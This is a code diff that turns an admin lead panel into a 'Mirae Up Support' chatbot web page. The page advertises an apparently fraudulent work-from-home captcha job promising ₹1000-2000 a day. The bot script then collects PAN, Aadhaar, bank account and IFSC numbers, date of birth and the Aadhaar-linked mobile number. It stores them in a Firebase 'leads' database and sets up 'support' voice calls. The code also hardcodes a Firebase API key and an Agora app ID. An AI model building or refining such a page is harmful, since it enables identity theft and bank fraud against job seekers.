@@ -1,43 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Mirae Pro</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Mirae Up Support</title>
+    <link rel="manifest" href="manifest.json">
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-messaging-compat.js"></script>
     <script src="https://download.agora.io/sdk/release/AgoraRTC_N.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
     <style>
-        body { font-family: sans-serif; margin: 0; background: #f0f2f5; display: flex; height: 100vh; flex-direction: column; }
-        .nav { background: #075e54; color: white; padding: 10px; display: flex; justify-content: space-between; align-items: center; }
-        .main { display: flex; flex: 1; overflow: hidden; }
-        .sidebar { width: 280px; background: white; border-right: 1px solid #ddd; overflow-y: auto; }
-        .chat-win { flex: 1; display: flex; flex-direction: column; background: #e5ddd5; }
-        .user-card { padding: 12px; border-bottom: 1px solid #eee; cursor: pointer; position: relative; }
-        .user-card.active { background: #e9f5f2; border-left: 5px solid #075e54; }
-        .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .online { background: #25d366; } .offline { background: #bbb; }
-        .badge { font-size: 10px; padding: 2px 5px; border-radius: 4px; color: white; margin-left: 5px; background: #e91e63; }
-        .msgs { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; }
-        .msg { padding: 10px; margin: 5px; border-radius: 6px; max-width: 80%; font-size: 14px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); background: white; }
-        .Admin { align-self: flex-end; background: #dcf8c6; } .User { align-self: flex-start; background: white; }
-        .input-bar { padding: 10px; background: #f0f0f0; display: flex; gap: 8px; align-items: center; border-top: 1px solid #ccc; }
-        input { flex: 1; padding: 12px; border-radius: 20px; border: 1px solid #ccc; outline: none; }
-        button.action { background: #075e54; color: white; border: none; padding: 10px; border-radius: 50%; cursor: pointer; width: 42px; height: 42px; }
-        @media (max-width: 768px) { .main { flex-direction: column; } .sidebar { width: 100%; height: 35%; } .chat-win { height: 65%; } }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
+        html, body { height: 100dvh; width: 100%; overflow: hidden; background:#dadbd3; }
+        .container { width:100%; max-width:500px; height: 100dvh; background:#e5ddd5; display:flex; flex-direction:column; margin: 0 auto; position: relative; }
+        .header { background:#075e54; color:white; padding:10px 15px; display:flex; align-items:center; gap:12px; height: 60px; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .header img { width:40px; height:40px; border-radius:50%; background:#fff; }
+        
+        #waPopup { position: absolute; top: -100px; left: 10px; right: 10px; background: white; padding: 12px; border-radius: 12px; display: flex; align-items: center; gap: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: 0.5s; z-index: 1000; border-left: 5px solid #25d366; cursor: pointer; }
+        #waPopup.show { top: 15px; }
+
+        .chat-box { flex:1; padding:15px; overflow-y:auto; display:flex; flex-direction:column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-size: cover; }
+        .msg { max-width:85%; padding:10px 14px; margin-bottom:12px; border-radius:10px; font-size:15px; line-height:1.5; position:relative; box-shadow: 0 1px 2px rgba(0,0,0,0.1); word-wrap: break-word; display:flex; flex-direction:column; background: white; }
+        .received { align-self: flex-start; border-top-left-radius:0; }
+        .sent { background:#dcf8c6; align-self: flex-end; border-top-right-radius:0; }
+        .time { font-size: 10px; color: #888; align-self: flex-end; margin-top: 4px; }
+        
+        #callUI { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(7, 94, 84, 0.98); z-index:2000; display:none; flex-direction:column; align-items:center; justify-content:center; color:white; }
+        .input-wrapper { background:#f0f0f0; padding:10px; display:flex; align-items:center; gap:8px; min-height: 70px; border-top:1px solid #ddd; padding-bottom: calc(10px + env(safe-area-inset-bottom)); }
+        .input-container { flex:1; background: white; border-radius: 25px; display: flex; align-items: center; padding: 2px 15px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
+        .input-container input { flex:1; border:none; outline:none; padding:12px 5px; font-size:16px; background: transparent; }
+        button#sendBtn { background:#075e54; color:white; border:none; width:48px; height:48px; border-radius:50%; cursor:pointer; display:flex; align-items:center; justify-content:center; flex-shrink: 0; }
+        
+        .btn-row { display:none; gap:10px; justify-content:center; padding:15px; background:rgba(255,255,255,0.9); flex-wrap: wrap; border-top: 1px solid #ddd; }
+        .opt-btn { background:#075e54; color:white; border:none; padding:10px 20px; border-radius:25px; cursor:pointer; font-weight:bold; }
+        .action-btn { display: block; background: #0088cc; color: white !important; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: bold; text-align: center; margin: 5px 0; width: 100%; border:none; cursor:pointer; font-size: 14px; }
     </style>
 </head>
 <body>
-<div class="nav"><b>Admin Control</b><button onclick="downloadExcel()" style="background:#128c7e;color:white;border:none;padding:8px;border-radius:5px;">📥 Excel</button></div>
-<div class="main"><div class="sidebar" id="userList"></div><div class="chat-win"><div id="cName" style="padding:10px;background:#fff;font-weight:bold;">Select User</div><div class="msgs" id="chatMsgs"></div>
-<div class="input-bar">
-    <button onclick="startAdminCall()" style="background:#25d366" class="action">📞</button>
-    <button onclick="adminEndCall()" style="background:#ff3b30" class="action">📵</button>
-    <input type="file" id="admMedia" style="display:none" onchange="uploadToCloud(this)">
-    <button onclick="document.getElementById('admMedia').click()" class="action" style="background:#555">📎</button>
-    <input type="text" id="aInp" placeholder="Reply...">
-    <button class="action" onclick="sendReply()">➤</button>
-</div></div></div>
+<audio id="waSound" src="https://assets.mixkit.co/active_storage/sfx/2357/2357-preview.mp3" preload="auto"></audio>
+<audio id="ringSound" src="https://assets.mixkit.co/active_storage/sfx/1359/1359-preview.mp3" loop preload="auto"></audio>
+
+<div id="callUI">
+    <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="100" style="border-radius:50%; border:3px solid white; margin-bottom:20px;">
+    <h2 id="callStatus">Support Calling...</h2>
+    <div style="display:flex; margin-top:50px; gap:30px;"><button id="ansBtn" style="background:#25d366;width:70px;height:70px;border-radius:50%;border:none;font-size:24px;color:white;cursor:pointer;">📞</button><button onclick="hangUpLocal()" style="background:#ff3b30;width:70px;height:70px;border-radius:50%;border:none;font-size:24px;color:white;cursor:pointer;">📵</button></div>
+</div>
+
+<div class="container">
+    <div id="waPopup" onclick="this.classList.remove('show')"><img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="40"><div style="flex:1;"><strong style="font-size:14px;color:#075e54;">Mirae Support</strong><p id="waPopupMsg" style="font-size:13px;color:#333;"></p></div></div>
+    <div class="header"><img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png"><div><div style="font-weight:bold; font-size: 16px;">Mirae Up Support</div><div id="status" style="font-size:12px; color:#cfd8dc;">Online</div></div></div>
+    <div class="chat-box" id="chatBox"></div>
+    <div id="buttonArea" class="btn-row"></div>
+    <div class="input-wrapper">
+        <div class="input-container">
+            <input type="text" id="userInput" placeholder="Type a message..." autocomplete="off">
+        </div>
+        <button id="sendBtn"><svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2,21L23,12L2,3V10L17,12L2,14V21Z" /></svg></button>
+    </div>
+</div>
+
 <script>
 const firebaseConfig = {
     apiKey: "AIzaSyDw439IXSmTpustCkIQpRQ7foZ-hc8XiDQ",
@@ -50,65 +71,128 @@ const firebaseConfig = {
 };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
-let activeUid = "", agoraClient, localTrack;
+const messaging = firebase.messaging();
+const AGORA_ID = "c0d5847270c04ed6b0bb4295ab2390b9";
 
-db.ref('leads').on('value', snap => {
-    const list = document.getElementById('userList'); list.innerHTML = "";
-    snap.forEach(u => {
-        const d = u.val();
-        const div = document.createElement('div');
-        div.className = `user-card ${activeUid === u.key ? 'active' : ''}`;
-        db.ref('status/' + u.key).on('value', s => {
-            const dot = s.val() === 'online' ? 'online' : 'offline';
-            const app = d.installed === 'Yes' ? '<span class="badge">App</span>' : '';
-            div.innerHTML = `<span class="dot ${dot}"></span><b>${d.fullName || 'User'}</b> ${app}<br><small>${u.key}</small>`;
+let userId = localStorage.getItem('chat_uid') || 'USR' + Math.floor(Math.random()*999999);
+localStorage.setItem('chat_uid', userId);
+
+const botSteps = [
+    { key: "welcome", type: "auto", msg: "Welcome 🤗 To Ang Mirae Up Work From Home" },
+    { key: "details", type: "auto", msg: "<b>Work Details 👇</b><br><b>Typing&Captcha And Form Fill Work</b><br><b>Daily Payout ₹1000-2000/Day</b><br>Without Investment! No Any Target<br>5Rs Per Captcha{200captcha/Day)<br><br><b>Eligibility 👇 Must Have 3 🆔</b><br>1:-Pan Card Number<br>2:-Adhar Link With Mobile 📱<br>3:- Bank For Salary<br><br>Interested Fill Form&Chat With Us 👇" },
+    { key: "fullName", type: "input", msg: "Please Enter Your Full Name" },
+    { key: "pan", type: "input", msg: "Enter Your PAN Card Number", pattern: /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/i },
+    { key: "aadhar", type: "input", msg: "Enter Your 12-digit Aadhar Number", pattern: /^[0-9]{12}$/ },
+    { key: "bankAcc", type: "input", msg: "Enter Your Bank Account Number" },
+    { key: "ifsc", type: "input", msg: "Enter Your Bank IFSC Code" },
+    { key: "dob", type: "date", msg: "Select Your Date of Birth" },
+    { key: "gender", type: "button", msg: "Select Your Gender", options: ["Male", "Female"] },
+    { key: "mobile", type: "input", msg: "Enter Your Aadhar Linked Mobile Number", pattern: /^[6-9][0-9]{9}$/ },
+    { key: "state", type: "input", msg: "Enter Your State" },
+    { key: "telegram", type: "button", msg: "Do You Have Telegram App?", options: ["Yes", "No"] }
+];
+
+let currentIdx = 0, isBotActive = true, agoraClient, localTrack;
+const chatBox = document.getElementById('chatBox'), userInput = document.getElementById('userInput'), buttonArea = document.getElementById('buttonArea'), statusText = document.getElementById('status'), waSound = document.getElementById('waSound'), ringSound = document.getElementById('ringSound');
+
+function getTime() { const d = new Date(); return d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0'); }
+
+function appendMsg(text, type, isHtml = true) {
+    const d = document.createElement('div'); d.className = `msg ${type}`;
+    d.innerHTML = text + `<span class="time">${getTime()}</span>`;
+    chatBox.appendChild(d); chatBox.scrollTop = chatBox.scrollHeight;
+}
+
+window.onload = async () => {
+    if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js');
+    db.ref('status/' + userId).set('online');
+    db.ref('status/' + userId).onDisconnect().set('offline');
+
+    const chatSnap = await db.ref('chats/' + userId).once('value');
+    if(chatSnap.exists()) chatSnap.forEach(c => appendMsg(c.val().message, c.val().sender === "Admin" ? "received" : "sent"));
+
+    const leadSnap = await db.ref('leads/' + userId).once('value');
+    const userData = leadSnap.val() || {};
+
+    if(userData.telegram) { isBotActive = false; } else {
+        let count = 0;
+        for(let s of botSteps) { if(s.key && userData[s.key]) count++; else if(s.type!=="auto") break; }
+        currentIdx = (count > 0) ? count + 2 : 0;
+        runBot();
+    }
+
+    db.ref('chats/' + userId).on('child_added', snap => {
+        const m = snap.val();
+        if(m.type === "call" && m.sender === "Admin") { document.getElementById('callUI').style.display='flex'; ringSound.play(); }
+        else if(m.type === "endcall") { document.getElementById('callUI').style.display='none'; ringSound.pause(); if(localTrack) localTrack.close(); }
+        else if(m.sender === "Admin") {
+            let last = chatBox.lastElementChild;
+            if(!last || !last.innerHTML.includes(m.message)) {
+                appendMsg(m.message, "received");
+                document.getElementById('waPopupMsg').innerText = m.message;
+                document.getElementById('waPopup').classList.add('show');
+                waSound.play().catch(()=>{});
+                setTimeout(()=>document.getElementById('waPopup').classList.remove('show'), 5000);
+            }
+        }
+    });
+};
+
+function runBot() {
+    if(currentIdx >= botSteps.length || !isBotActive) return;
+    const step = botSteps[currentIdx];
+    statusText.innerText = "typing...";
+    setTimeout(() => {
+        appendMsg(step.msg, "received", true); statusText.innerText = "Online";
+        if(step.type === "auto") { currentIdx++; runBot(); }
+        else setupUI(step);
+    }, 600);
+}
+
+function setupUI(step) {
+    buttonArea.style.display = step.type === "button" ? "flex" : "none";
+    userInput.type = step.type === "date" ? "date" : "text";
+    if(step.type === "button") {
+        buttonArea.innerHTML = "";
+        step.options.forEach(opt => {
+            const btn = document.createElement('button'); btn.className="opt-btn"; btn.innerText=opt;
+            btn.onclick = () => handleInput(opt); buttonArea.appendChild(btn);
         });
-        div.onclick = () => { activeUid = u.key; document.getElementById('cName').innerText = d.fullName; loadChat(u.key); };
-        list.appendChild(div);
-    });
-});
-
-function loadChat(uid) {
-    db.ref('chats/' + uid).on('value', snap => {
-        const box = document.getElementById('chatMsgs'); box.innerHTML = "";
-        snap.forEach(m => { box.innerHTML += `<div class="msg ${m.val().sender}">${m.val().message}</div>`; });
-        box.scrollTop = box.scrollHeight;
-    });
+    }
+    if(step.type === "date") userInput.onchange = () => { if(userInput.value) handleInput(userInput.value); };
 }
 
-function sendReply() {
-    const v = document.getElementById('aInp').value;
-    if(v && activeUid) { db.ref('chats/' + activeUid).push({ sender: "Admin", message: v }); document.getElementById('aInp').value = ""; }
+async function handleInput(val) {
+    const step = botSteps[currentIdx];
+    if(step && step.pattern && !step.pattern.test(val.toUpperCase())) return appendMsg("❌ Format Galat Hai!", "received", true);
+    appendMsg(val, "sent");
+    userInput.value = "";
+    if(step && step.key) {
+        await db.ref('leads/' + userId).update({ [step.key]: val, uid: userId });
+        await db.ref('chats/' + userId).push({ sender: "User", message: val, time: getTime() });
+        if(step.key === "telegram") { isBotActive = false; appendMsg("Form Submitted! Chat with agent.", "received"); }
+    }
+    currentIdx++; runBot();
 }
 
-async function startAdminCall() {
-    if(!activeUid) return alert("Select user!");
-    db.ref('chats/' + activeUid).push({ sender: "Admin", type: "call", message: "calling..." });
+document.getElementById('sendBtn').onclick = () => {
+    const v = userInput.value.trim();
+    if(!v) return;
+    if(isBotActive && currentIdx < botSteps.length && botSteps[currentIdx].type === "input") handleInput(v);
+    else { appendMsg(v, "sent"); db.ref('chats/' + userId).push({ sender: "User", message: v, time: getTime() }); }
+    userInput.value = "";
+};
+
+document.getElementById('ansBtn').onclick = async () => {
+    document.getElementById('waRing').pause();
     agoraClient = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });
-    await agoraClient.join("c0d5847270c04ed6b0bb4295ab2390b9", "mirae_" + activeUid, null);
+    await agoraClient.join(AGORA_ID, "mirae_" + userId, null);
     localTrack = await AgoraRTC.createMicrophoneAudioTrack({ AEC: true, ANS: true });
     await agoraClient.publish([localTrack]);
     agoraClient.on("user-published", async (u, mt) => { await agoraClient.subscribe(u, mt); if (mt === "audio") u.audioTrack.play(); });
-}
+};
 
-function adminEndCall() {
-    if(localTrack) localTrack.close();
-    db.ref('chats/' + activeUid).push({ sender: "Admin", type: "endcall", message: "Ended" });
-}
-
-async function uploadToCloud(input) {
-    if(!activeUid) return alert("Lead select!");
-    const file = input.files[0]; if(!file) return;
-    const formData = new FormData();
-    formData.append('file', file); formData.append('upload_preset', 'mirae_preset');
-    const res = await fetch(`https://api.cloudinary.com/v1_1/dqw0atvkp/upload`, {method:'POST', body:formData});
-    const data = await res.json();
-    await db.ref('chats/' + activeUid).push({ sender: "Admin", message: data.secure_url, type: (file.type.startsWith('video') ? 'video' : 'image') });
-}
-
-function downloadExcel() {
-    // XLSX download logic...
-}
+function hangUpLocal() { db.ref('chats/' + userId).push({ sender: "User", type: "endcall", message: "Ended" }); }
 </script>
 </body>
 </html>
